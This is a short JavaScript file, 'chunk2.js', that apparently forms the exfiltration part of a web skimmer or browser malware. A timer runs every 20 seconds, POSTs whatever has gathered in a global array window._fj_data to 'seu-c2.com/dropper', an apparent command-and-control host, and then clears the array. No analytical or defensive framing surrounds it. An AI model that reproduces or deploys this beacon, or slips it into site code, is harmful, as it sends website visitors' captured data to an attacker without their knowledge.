// chunk2.js
setInterval(()=>{
    if(window._fj_data.length){
      fetch("https://seu-c2.com/dropper", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify(window._fj_data)
      });
      window._fj_data = [];
    }
  }, 20000);